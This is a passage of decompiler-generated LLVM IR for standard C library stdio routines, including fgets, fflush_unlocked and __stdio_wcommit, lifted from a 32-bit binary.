  %v2_804cebb = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804cebb, i32* @ebx, align 4
  store i32 %v0_804ce36, i32* @esi, align 4
  ret i32 %v2_804ceba

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_804ceb3, { 1, 0 }
  uselistorder label %dec_label_pc_804cea2, { 1, 0 }
  uselistorder label %dec_label_pc_804ce80, { 1, 0 }
  uselistorder label %dec_label_pc_804ce59, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_804cec0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804cec8 = add i32 %arg1, 8
  %v2_804cec8 = inttoptr i32 %v1_804cec8 to i32*
  %v3_804cec8 = load i32, i32* %v2_804cec8, align 4
  store i32 %v3_804cec8, i32* %edx.global-to-local, align 4
  %v1_804cecb = add i32 %arg1, 16
  %v2_804cecb = inttoptr i32 %v1_804cecb to i32*
  %v3_804cecb = load i32, i32* %v2_804cecb, align 4
  %v2_804cece = sub i32 %v3_804cecb, %v3_804cec8
  %v12_804cece = icmp eq i32 %v2_804cece, 0
  store i32 %v2_804cece, i32* %eax.global-to-local, align 4
  br i1 %v12_804cece, label %dec_label_pc_804cee1, label %dec_label_pc_804ced2

dec_label_pc_804ced2:                             ; preds = %entry
  store i32 %v3_804cec8, i32* %v2_804cecb, align 4
  %v0_804ced5 = load i32, i32* @ecx, align 4
  %v0_804ced6 = load i32, i32* %eax.global-to-local, align 4
  %v0_804ced7 = load i32, i32* %edx.global-to-local, align 4
  %v0_804ced8 = load i32, i32* @ebx, align 4
  %v4_804ced9 = inttoptr i32 %v0_804ced8 to i16*
  %v5_804ced9 = call i32 @__stdio_WRITE(i16* %v4_804ced9, i32 %v0_804ced7, i32 %v0_804ced6, i32 %v0_804ced5)
  store i32 %v5_804ced9, i32* %eax.global-to-local, align 4
  %v0_804cee1.pre = load i32, i32* @ebx, align 4
  %v2_804cee7.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804cee1

dec_label_pc_804cee1:                             ; preds = %entry, %dec_label_pc_804ced2
  %v2_804cee7 = phi i32 [ %tmp11, %entry ], [ %v2_804cee7.pre, %dec_label_pc_804ced2 ]
  %v0_804cee1 = phi i32 [ %arg1, %entry ], [ %v0_804cee1.pre, %dec_label_pc_804ced2 ]
  %v1_804cee1 = add i32 %v0_804cee1, 16
  %v2_804cee1 = inttoptr i32 %v1_804cee1 to i32*
  %v3_804cee1 = load i32, i32* %v2_804cee1, align 4
  store i32 %v3_804cee1, i32* %eax.global-to-local, align 4
  %v2_804cee4 = add i32 %v0_804cee1, 8
  %v3_804cee4 = inttoptr i32 %v2_804cee4 to i32*
  %v4_804cee4 = load i32, i32* %v3_804cee4, align 4
  %v5_804cee4 = sub i32 %v3_804cee1, %v4_804cee4
  store i32 %v5_804cee4, i32* %eax.global-to-local, align 4
  store i32 %v2_804cee7, i32* @edx, align 4
  store i32 %v0_804cec0, i32* @ebx, align 4
  ret i32 %v5_804cee4

; uselistorder directives
  uselistorder i32 %v0_804cee1, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804cee1, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804ceec = load i32, i32* @edi, align 4
  %v0_804ceed = load i32, i32* @esi, align 4
  %v0_804ceee = load i32, i32* @ebx, align 4
  %v12_804ceef = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_804cef6 = add i32 %arg3, 52
  %v2_804cef6 = inttoptr i32 %v1_804cef6 to i32*
  %v3_804cef6 = load i32, i32* %v2_804cef6, align 4
  store i32 %v3_804cef6, i32* @edi, align 4
  %v1_804cef9 = icmp eq i32 %v3_804cef6, 0
  %v1_804cefb = icmp eq i1 %v1_804cef9, false
  br i1 %v1_804cefb, label %entry.dec_label_pc_804cf1c_crit_edge, label %dec_label_pc_804cefd

entry.dec_label_pc_804cf1c_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804cf1c

dec_label_pc_804cefd:                             ; preds = %entry
  %v1_804cefd = add i32 %arg3, 56
  store i32 %v1_804cefd, i32* @ebx, align 4
  store i32 %v12_804ceef, i32* @eax, align 4
  %v2_804cf0c = call i32 @__pthread_return_void(i32 %v12_804ceef, i32 134526883)
  %v0_804cf11 = load i32, i32* @ebx, align 4
  %v1_804cf14 = call i32 @__pthread_return_0(i32 %v0_804cf11)
  %v0_804cf1d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804cf1c

dec_label_pc_804cf1c:                             ; preds = %entry.dec_label_pc_804cf1c_crit_edge, %dec_label_pc_804cefd
  %v0_804cf1d = phi i32 [ %arg3, %entry.dec_label_pc_804cf1c_crit_edge ], [ %v0_804cf1d.pre, %dec_label_pc_804cefd ]
  %v0_804cf1c = load i32, i32* @edx, align 4
  %v4_804cf26 = inttoptr i32 %arg1 to i8*
  %v5_804cf26 = call i32 @__GI_fgets_unlocked(i8* %v4_804cf26, i32 %arg2, i32 %v0_804cf1d, i32 %v0_804cf1c)
  store i32 %v5_804cf26, i32* %ebx.global-to-local, align 4
  br i1 %v1_804cefb, label %dec_label_pc_804cf45, label %dec_label_pc_804cf34

dec_label_pc_804cf34:                             ; preds = %dec_label_pc_804cf1c
  store i32 %v12_804ceef, i32* @eax, align 4
  %v2_804cf3d = call i32 @__pthread_return_void(i32 %v12_804ceef, i32 1)
  %v0_804cf48.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804cf45

dec_label_pc_804cf45:                             ; preds = %dec_label_pc_804cf1c, %dec_label_pc_804cf34
  %v0_804cf48 = phi i32 [ %v5_804cf26, %dec_label_pc_804cf1c ], [ %v0_804cf48.pre, %dec_label_pc_804cf34 ]
  store i32 %v0_804ceee, i32* @ebx, align 4
  store i32 %v0_804ceed, i32* @esi, align 4
  store i32 %v0_804ceec, i32* @edi, align 4
  ret i32 %v0_804cf48

; uselistorder directives
  uselistorder i32 %v12_804ceef, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804cf45, { 1, 0 }
  uselistorder label %dec_label_pc_804cf1c, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_804cf5f = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804cf5f, i32* @eax, align 4
  %v2_804cf64 = call i32 @__pthread_return_void(i32 %v2_804cf5f, i32 134526883)
  %v1_804cf70 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  %v0_804cf75 = load i32, i32* @global_var_8052548.99, align 8
  %v8_804cf7d = icmp eq i32 %v0_804cf75, 1
  %v1_804cf7e = icmp eq i1 %v8_804cf7d, false
  br i1 %v1_804cf7e, label %dec_label_pc_804d015, label %dec_label_pc_804cf84

dec_label_pc_804cf84:                             ; preds = %entry
  %v0_804cf84 = load i32, i32* @global_var_805254c.100, align 4
  %tmp29 = icmp slt i32 %v0_804cf84, 1
  br i1 %tmp29, label %dec_label_pc_804d015, label %dec_label_pc_804cf91

dec_label_pc_804cf91:                             ; preds = %dec_label_pc_804cf84
  store i32 0, i32* @esi, align 4
  %v2_804cf9e = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_804cf9e, i32* @eax, align 4
  %v2_804cfa3 = call i32 @__pthread_return_void(i32 %v2_804cf9e, i32 134526883)
  %v1_804cfaf = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052190.102 to i32))
  %v0_804cfb4 = load i32, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  store i32 %v0_804cfb4, i32* %edx.global-to-local, align 4
  %v1_804cff63 = icmp eq i32 %v0_804cfb4, 0
  %v1_804cff810 = icmp eq i1 %v1_804cff63, false
  br i1 %v1_804cff810, label %dec_label_pc_804cfbf, label %dec_label_pc_804cffa

dec_label_pc_804cfbf:                             ; preds = %dec_label_pc_804cf91, %dec_label_pc_804cff4
  %v1_804cfbf14.in = phi i32 [ %v0_804cff4, %dec_label_pc_804cff4 ], [ %v0_804cfb4, %dec_label_pc_804cf91 ]
  %v1_804cfbf14 = inttoptr i32 %v1_804cfbf14.in to i16*
  %v2_804cfbf = load i16, i16* %v1_804cfbf14, align 2
  %v1_804cfc2 = add i32 %v1_804cfbf14.in, 32
  %v2_804cfc2 = inttoptr i32 %v1_804cfc2 to i32*
  %v3_804cfc2 = load i32, i32* %v2_804cfc2, align 4
  store i32 %v3_804cfc2, i32* @ebx, align 4
  %v1_804cfc5 = and i16 %v2_804cfbf, -32720
  %v6_804cfca = icmp eq i16 %v1_804cfc5, 48
  br i1 %v6_804cfca, label %dec_label_pc_804cfd3, label %dec_label_pc_804cfcf

dec_label_pc_804cfcf:                             ; preds = %dec_label_pc_804cfbf
  store i32 %v1_804cfbf14.in, i32* @esi, align 4
  br label %dec_label_pc_804cff4

dec_label_pc_804cfd3:                             ; preds = %dec_label_pc_804cfbf
  %v0_804cfd3 = load i32, i32* @esi, align 4
  %v1_804cfd3 = icmp eq i32 %v0_804cfd3, 0
  %v1_804cfd5 = icmp eq i1 %v1_804cfd3, false
  br i1 %v1_804cfd5, label %dec_label_pc_804cfdf, label %dec_label_pc_804cfd7

dec_label_pc_804cfd7:                             ; preds = %dec_label_pc_804cfd3
  store i32 %v3_804cfc2, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  br label %dec_label_pc_804cfe2

dec_label_pc_804cfdf:                             ; preds = %dec_label_pc_804cfd3
  %v2_804cfdf = add i32 %v0_804cfd3, 32
  %v3_804cfdf = inttoptr i32 %v2_804cfdf to i32*
  store i32 %v3_804cfc2, i32* %v3_804cfdf, align 4
  %v0_804cfe2.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804cfe2

dec_label_pc_804cfe2:                             ; preds = %dec_label_pc_804cfd7, %dec_label_pc_804cfdf
  %v0_804cfeb = phi i32 [ %v1_804cfbf14.in, %dec_label_pc_804cfd7 ], [ %v0_804cfe2.pre, %dec_label_pc_804cfdf ]
  %v1_804cfe2 = add i32 %v0_804cfeb, 1
  %v2_804cfe2 = inttoptr i32 %v1_804cfe2 to i8*
  %v3_804cfe2 = load i8, i8* %v2_804cfe2, align 1
  %v4_804cfe2 = and i8 %v3_804cfe2, 32
  %v5_804cfe2 = icmp eq i8 %v4_804cfe2, 0
  br i1 %v5_804cfe2, label %dec_label_pc_804cff4, label %dec_label_pc_804cfe8

dec_label_pc_804cfe8:                             ; preds = %dec_label_pc_804cfe2
  %v1_804cfec = call i32 @free(i32 %v0_804cfeb)
  br label %dec_label_pc_804cff4

dec_label_pc_804cff4:                             ; preds = %dec_label_pc_804cfe2, %dec_label_pc_804cfcf, %dec_label_pc_804cfe8
  %v0_804cff4 = load i32, i32* @ebx, align 4
  store i32 %v0_804cff4, i32* %edx.global-to-local, align 4
  %v1_804cff6 = icmp eq i32 %v0_804cff4, 0
  %v1_804cff8 = icmp eq i1 %v1_804cff6, false
  br i1 %v1_804cff8, label %dec_label_pc_804cfbf, label %dec_label_pc_804cffa

dec_label_pc_804cffa:                             ; preds = %dec_label_pc_804cff4, %dec_label_pc_804cf91
  store i32 %v2_804cf9e, i32* @eax, align 4
  %v2_804d003 = call i32 @__pthread_return_void(i32 %v2_804cf9e, i32 1)
  store i32 0, i32* @global_var_805254c.100, align 4
  %v0_804d015.pre = load i32, i32* @global_var_8052548.99, align 8
  br label %dec_label_pc_804d015

dec_label_pc_804d015:                             ; preds = %dec_label_pc_804cf84, %entry, %dec_label_pc_804cffa
  %v0_804d015 = phi i32 [ %v0_804cf75, %dec_label_pc_804cf84 ], [ %v0_804cf75, %entry ], [ %v0_804d015.pre, %dec_label_pc_804cffa ]
  %v1_804d01a = add i32 %v0_804d015, -1
  store i32 %v1_804d01a, i32* @global_var_8052548.99, align 8
  store i32 %v2_804cf5f, i32* @eax, align 4
  %v2_804d029 = call i32 @__pthread_return_void(i32 %v2_804cf5f, i32 1)
  ret i32 %v2_804d029

; uselistorder directives
  uselistorder i32 %v0_804cff4, { 1, 2, 0 }
  uselistorder i32 %v1_804cfbf14.in, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804cf75, { 1, 2, 0 }
  uselistorder i32 (i32)* @free, { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 1, 7, 6, 5, 4, 3, 20, 19, 2, 0 }
  uselistorder label %dec_label_pc_804d015, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cff4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cfe2, { 1, 0 }
  uselistorder label %dec_label_pc_804cfbf, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_804d034 = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_804d037 = load i32, i32* @edi, align 4
  %v0_804d038 = load i32, i32* @esi, align 4
  %v0_804d039 = load i32, i32* @ebx, align 4
  %v4_804d03d = ptrtoint i16* %arg1 to i32
  store i32 %v4_804d03d, i32* @ebx, align 4
  %v10_804d041 = icmp eq i16* %arg1, inttoptr (i32 134553996 to i16*)
  br i1 %v10_804d041, label %dec_label_pc_804d055, label %dec_label_pc_804d049

dec_label_pc_804d049:                             ; preds = %entry
  %v2_804d049 = icmp eq i16* %arg1, null
  store i32 256, i32* @ebp, align 4
  %v1_804d04f = icmp eq i1 %v2_804d049, false
  br i1 %v1_804d04f, label %dec_label_pc_804d14d, label %dec_label_pc_804d055

dec_label_pc_804d055:                             ; preds = %dec_label_pc_804d049, %entry
  store i32 0, i32* @edi, align 4
  %v2_804d062 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804d062, i32* @ebx, align 4
  %v2_804d067 = call i32 @__pthread_return_void(i32 %v2_804d062, i32 134526883)
  %v1_804d073 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  %v0_804d078 = load i32, i32* @global_var_8052548.99, align 8
  store i32 ptrtoint (i32* @global_var_80521a8.98 to i32), i32* @ecx, align 4
  %v1_804d07f = add i32 %v0_804d078, 1
  store i32 %v1_804d07f, i32* @eax, align 4
  store i32 %v1_804d07f, i32* @global_var_8052548.99, align 8
  %v2_804d088 = call i32 @__pthread_return_void(i32 %v2_804d062, i32 1)
  store i32 %v2_804d088, i32* @eax, align 4
  %v2_804d09b = call i32 @__pthread_return_void(i32 %v2_804d062, i32 134526883)
  %v1_804d0a7 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052190.102 to i32))
  %v0_804d0ac = load i32, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  store i32 %v0_804d0ac, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_8052190.102 to i32), i32* @eax, align 4
  %v2_804d0b7 = call i32 @__pthread_return_void(i32 %v2_804d062, i32 1)
  %v0_804d13e1 = load i32, i32* @esi, align 4
  %v1_804d13e2 = icmp eq i32 %v0_804d13e1, 0
  %v1_804d1409 = icmp eq i1 %v1_804d13e2, false
  br i1 %v1_804d1409, label %dec_label_pc_804d0c1, label %dec_label_pc_804d146

dec_label_pc_804d0c1:                             ; preds = %dec_label_pc_804d055, %dec_label_pc_804d13b
  %v0_804d0cf = phi i32 [ %v3_804d13b, %dec_label_pc_804d13b ], [ %v0_804d13e1, %dec_label_pc_804d055 ]
  %v1_804d0c1 = inttoptr i32 %v0_804d0cf to i8*
  %v2_804d0c1 = load i8, i8* %v1_804d0c1, align 1
  %v3_804d0c1 = and i8 %v2_804d0c1, 64
  %v4_804d0c1 = icmp eq i8 %v3_804d0c1, 0
  br i1 %v4_804d0c1, label %dec_label_pc_804d13b, label %dec_label_pc_804d0c6

dec_label_pc_804d0c6:                             ; preds = %dec_label_pc_804d0c1
  %v0_804d0c6 = load i32, i32* @global_var_80521c0.101, align 64
  %v9_804d0c6 = icmp eq i32 %v0_804d0c6, 2
  br i1 %v9_804d0c6, label %dec_label_pc_804d0ee, label %dec_label_pc_804d0cf

dec_label_pc_804d0cf:                             ; preds = %dec_label_pc_804d0c6
  %v1_804d0cf = add i32 %v0_804d0cf, 56
  store i32 %v1_804d0cf, i32* @ebx, align 4
  store i32 %v2_804d062, i32* @eax, align 4
  %v2_804d0de = call i32 @__pthread_return_void(i32 %v2_804d062, i32 134526883)
  %v0_804d0e3 = load i32, i32* @ebx, align 4
  %v1_804d0e6 = call i32 @__pthread_return_0(i32 %v0_804d0e3)
  %v0_804d0ee.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804d0ee

dec_label_pc_804d0ee:                             ; preds = %dec_label_pc_804d0c6, %dec_label_pc_804d0cf
  %v0_804d101 = phi i32 [ %v0_804d0cf, %dec_label_pc_804d0c6 ], [ %v0_804d0ee.pre, %dec_label_pc_804d0cf ]
  %v1_804d0ee = inttoptr i32 %v0_804d101 to i32*
  %v2_804d0ee = load i32, i32* %v1_804d0ee, align 4
  %v1_804d0f0 = load i32, i32* @ebp, align 4
  %v2_804d0f0 = or i32 %v1_804d0f0, %v2_804d0ee
  %v1_804d0f2 = and i32 %v2_804d0f0, 832
  %v2_804d0f7 = icmp eq i32 %v1_804d0f2, 320
  %v1_804d0fc = icmp eq i1 %v2_804d0f7, false
  br i1 %v1_804d0fc, label %dec_label_pc_804d121, label %dec_label_pc_804d0fe

dec_label_pc_804d0fe:                             ; preds = %dec_label_pc_804d0ee
  %v1_804d102 = call i32 @__stdio_wcommit(i32 %v0_804d101)
  %v1_804d10a = icmp eq i32 %v1_804d102, 0
  br i1 %v1_804d10a, label %dec_label_pc_804d113, label %dec_label_pc_804d10e

dec_label_pc_804d10e:                             ; preds = %dec_label_pc_804d0fe
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804d121

dec_label_pc_804d113:                             ; preds = %dec_label_pc_804d0fe
  %v0_804d113 = load i32, i32* @esi, align 4
  %v1_804d113 = add i32 %v0_804d113, 8
  %v2_804d113 = inttoptr i32 %v1_804d113 to i32*
  %v3_804d113 = load i32, i32* %v2_804d113, align 4
  %v2_804d116 = add i32 %v0_804d113, 28
  %v3_804d116 = inttoptr i32 %v2_804d116 to i32*
  store i32 %v3_804d113, i32* %v3_804d116, align 4
  %v0_804d119 = load i32, i32* @esi, align 4
  %v1_804d119 = inttoptr i32 %v0_804d119 to i32*
  %v2_804d119 = load i32, i32* %v1_804d119, align 4
  %v2_804d119.tr = trunc i32 %v2_804d119 to i16
  %v1_804d11e = and i16 %v2_804d119.tr, -65
  %v3_804d11e = inttoptr i32 %v0_804d119 to i16*
  store i16 %v1_804d11e, i16* %v3_804d11e, align 2
  br label %dec_label_pc_804d121

dec_label_pc_804d121:                             ; preds = %dec_label_pc_804d0ee, %dec_label_pc_804d10e, %dec_label_pc_804d113
  %v0_804d121 = load i32, i32* @global_var_80521c0.101, align 64
  %v9_804d121 = icmp eq i32 %v0_804d121, 2
  br i1 %v9_804d121, label %dec_label_pc_804d13b, label %dec_label_pc_804d12a

dec_label_pc_804d12a:                             ; preds = %dec_label_pc_804d121
  store i32 %v2_804d062, i32* @eax, align 4
  %v2_804d133 = call i32 @__pthread_return_void(i32 %v2_804d062, i32 1)
  br label %dec_label_pc_804d13b

dec_label_pc_804d13b:                             ; preds = %dec_label_pc_804d121, %dec_label_pc_804d0c1, %dec_label_pc_804d12a
  %v0_804d13b = load i32, i32* @esi, align 4
  %v1_804d13b = add i32 %v0_804d13b, 32
  %v2_804d13b = inttoptr i32 %v1_804d13b to i32*
  %v3_804d13b = load i32, i32* %v2_804d13b, align 4
  store i32 %v3_804d13b, i32* @esi, align 4
  %v1_804d13e = icmp eq i32 %v3_804d13b, 0
  %v1_804d140 = icmp eq i1 %v1_804d13e, false
  br i1 %v1_804d140, label %dec_label_pc_804d0c1, label %dec_label_pc_804d146

dec_label_pc_804d146:                             ; preds = %dec_label_pc_804d13b, %dec_label_pc_804d055
  %v0_804d146 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_804d177

dec_label_pc_804d14d:                             ; preds = %dec_label_pc_804d049
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_804d14f = load i8, i8* %tmp23, align 1
  %v4_804d14f = and i8 %v3_804d14f, 64
  %v5_804d14f = icmp eq i8 %v4_804d14f, 0
  br i1 %v5_804d14f, label %dec_label_pc_804d177, label %dec_label_pc_804d154

dec_label_pc_804d154:                             ; preds = %dec_label_pc_804d14d
  store i32 -1, i32* @edi, align 4
  %v1_804d15b = call i32 @__stdio_wcommit(i32 %v4_804d03d)
  %v1_804d163 = icmp eq i32 %v1_804d15b, 0
  %v1_804d165 = icmp eq i1 %v1_804d163, false
  br i1 %v1_804d165, label %dec_label_pc_804d177, label %dec_label_pc_804d167

dec_label_pc_804d167:                             ; preds = %dec_label_pc_804d154
  %v2_804d167 = add i32 %v4_804d03d, 8
  %v3_804d167 = inttoptr i32 %v2_804d167 to i32*
  %v4_804d167 = load i32, i32* %v3_804d167, align 4
  store i32 0, i32* @edi, align 4
  %v3_804d16c = add i32 %v4_804d03d, 28
  %v4_804d16c = inttoptr i32 %v3_804d16c to i32*
  store i32 %v4_804d167, i32* %v4_804d16c, align 4
  %tmp24 = bitcast i16* %arg1 to i32*
  %v3_804d16f = load i32, i32* %tmp24, align 4
  %v3_804d16f.tr = trunc i32 %v3_804d16f to i16
  %v1_804d174 = and i16 %v3_804d16f.tr, -65
  store i16 %v1_804d174, i16* %arg1, align 2
  br label %dec_label_pc_804d177

dec_label_pc_804d177:                             ; preds = %dec_label_pc_804d154, %dec_label_pc_804d14d, %dec_label_pc_804d146, %dec_label_pc_804d167
  %v0_804d17a = load i32, i32* @edi, align 4
  store i32 %v0_804d039, i32* @ebx, align 4
  store i32 %v0_804d038, i32* @esi, align 4
  store i32 %v0_804d037, i32* @edi, align 4
  store i32 %v0_804d034, i32* @ebp, align 4
  ret i32 %v0_804d17a

; uselistorder directives
  uselistorder i32 %v3_804d13b, { 1, 2, 0 }
  uselistorder i32 %v2_804d062, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805218c.104 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_8052548.99, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_80521a8.98 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 2, 3, 4, 1, 0, 5 }
  uselistorder label %dec_label_pc_804d177, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d13b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d121, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d0ee, { 1, 0 }
  uselistorder label %dec_label_pc_804d0c1, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_804d184 = load i32, i32* @ebp, align 4
  %v4_804d18f = ptrtoint i8* %arg1 to i32
  store i32 %v4_804d18f, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_804d18f, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_804d1d5.preheader, label %dec_label_pc_804d1e1

dec_label_pc_804d1d5.preheader:                   ; preds = %entry
  %v1_804d1d519 = add i32 %arg2, -1
  %v8_804d1d520 = icmp eq i32 %v1_804d1d519, 0
  store i32 %v1_804d1d519, i32* @esi, align 4
  %v1_804d1d622 = icmp eq i1 %v8_804d1d520, false
  br i1 %v1_804d1d622, label %dec_label_pc_804d19f, label %dec_label_pc_804d1d8

dec_label_pc_804d19f:                             ; preds = %dec_label_pc_804d1d5.preheader, %dec_label_pc_804d1d3.dec_label_pc_804d1d5_crit_edge.dec_label_pc_804d19f_crit_edge
  %v0_804d19f = phi i32 [ %v0_804d19f.pre, %dec_label_pc_804d1d3.dec_label_pc_804d1d5_crit_edge.dec_label_pc_804d19f_crit_edge ], [ %arg3, %dec_label_pc_804d1d5.preheader ]
  %v1_804d19f = add i32 %v0_804d19f, 16
  %v2_804d19f = inttoptr i32 %v1_804d19f to i32*
  %v3_804d19f = load i32, i32* %v2_804d19f, align 4
  store i32 %v3_804d19f, i32* %eax.global-to-local, align 4
  %v2_804d1a2 = add i32 %v0_804d19f, 24
  %v3_804d1a2 = inttoptr i32 %v2_804d1a2 to i32*
  %v4_804d1a2 = load i32, i32* %v3_804d1a2, align 4
  %v10_804d1a2 = icmp ult i32 %v3_804d19f, %v4_804d1a2
  %v1_804d1a5 = icmp eq i1 %v10_804d1a2, false
  br i1 %v1_804d1a5, label %dec_label_pc_804d1b5, label %dec_label_pc_804d1a7

dec_label_pc_804d1a7:                             ; preds = %dec_label_pc_804d19f
  %v1_804d1a7 = inttoptr i32 %v3_804d19f to i8*
  %v2_804d1a7 = load i8, i8* %v1_804d1a7, align 1
  %v3_804d1a7 = zext i8 %v2_804d1a7 to i32
  %v4_804d1a7 = load i32, i32* @edx, align 4
  %v5_804d1a7 = and i32 %v4_804d1a7, -256
  %v6_804d1a7 = or i32 %v5_804d1a7, %v3_804d1a7
  store i32 %v6_804d1a7, i32* @edx, align 4
  %v1_804d1a9 = add i32 %v3_804d19f, 1
  store i32 %v1_804d1a9, i32* %eax.global-to-local, align 4
  %v2_804d1aa = load i32, i32* @ebx, align 4
  %v3_804d1aa = inttoptr i32 %v2_804d1aa to i8*
  store i8 %v2_804d1a7, i8* %v3_804d1aa, align 1
  %v0_804d1ac = load i32, i32* @ebx, align 4
  %v1_804d1ac = add i32 %v0_804d1ac, 1
  store i32 %v1_804d1ac, i32* @ebx, align 4
  %v0_804d1ad = load i32, i32* @edx, align 4
  %v1_804d1ad = trunc i32 %v0_804d1ad to i8
  %v10_804d1ad = icmp eq i8 %v1_804d1ad, 10
  %v0_804d1b0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d1b0 = load i32, i32* @ebp, align 4
  %v2_804d1b0 = add i32 %v1_804d1b0, 16
  %v3_804d1b0 = inttoptr i32 %v2_804d1b0 to i32*
  store i32 %v0_804d1b0, i32* %v3_804d1b0, align 4
  br i1 %v10_804d1ad, label %dec_label_pc_804d1d8, label %dec_label_pc_804d1d3.dec_label_pc_804d1d5_crit_edge

dec_label_pc_804d1b5:                             ; preds = %dec_label_pc_804d19f
  %v0_804d1b9 = call i32 @getc_unlocked()
  %v1_804d1b9 = trunc i32 %v0_804d1b9 to i8
  store i32 %v0_804d1b9, i32* %eax.global-to-local, align 4
  %sext.mask = urem i32 %v0_804d1b9, 256
  %v11_804d1c1 = icmp eq i32 %sext.mask, 255
  %v1_804d1c4 = icmp eq i1 %v11_804d1c1, false
  br i1 %v1_804d1c4, label %dec_label_pc_804d1d3, label %dec_label_pc_804d1c6

dec_label_pc_804d1c6:                             ; preds = %dec_label_pc_804d1b5
  %v0_804d1c6 = load i32, i32* @ebp, align 4
  %v1_804d1c6 = inttoptr i32 %v0_804d1c6 to i8*
  %v2_804d1c6 = load i8, i8* %v1_804d1c6, align 1
  %v3_804d1c6 = and i8 %v2_804d1c6, 8
  %v4_804d1c6 = icmp eq i8 %v3_804d1c6, 0
  br i1 %v4_804d1c6, label %dec_label_pc_804d1d8, label %dec_label_pc_804d1e1

dec_label_pc_804d1d3:                             ; preds = %dec_label_pc_804d1b5
  %v3_804d1ce = load i32, i32* @ebx, align 4
  %v4_804d1ce = inttoptr i32 %v3_804d1ce to i8*
  store i8 %v1_804d1b9, i8* %v4_804d1ce, align 1
  %v0_804d1d0 = load i32, i32* @ebx, align 4
  %v1_804d1d0 = add i32 %v0_804d1d0, 1
  store i32 %v1_804d1d0, i32* @ebx, align 4
  %v11_804d1d1 = icmp eq i8 %v1_804d1b9, 10
  br i1 %v11_804d1d1, label %dec_label_pc_804d1d8, label %dec_label_pc_804d1d3.dec_label_pc_804d1d5_crit_edge

dec_label_pc_804d1d3.dec_label_pc_804d1d5_crit_edge: ; preds = %dec_label_pc_804d1a7, %dec_label_pc_804d1d3
  %v0_804d1d5.pre = load i32, i32* @esi, align 4
  %v1_804d1d5 = add i32 %v0_804d1d5.pre, -1
  %v8_804d1d5 = icmp eq i32 %v1_804d1d5, 0
  store i32 %v1_804d1d5, i32* @esi, align 4
  %v1_804d1d6 = icmp eq i1 %v8_804d1d5, false
  br i1 %v1_804d1d6, label %dec_label_pc_804d1d3.dec_label_pc_804d1d5_crit_edge.dec_label_pc_804d19f_crit_edge, label %dec_label_pc_804d1d8

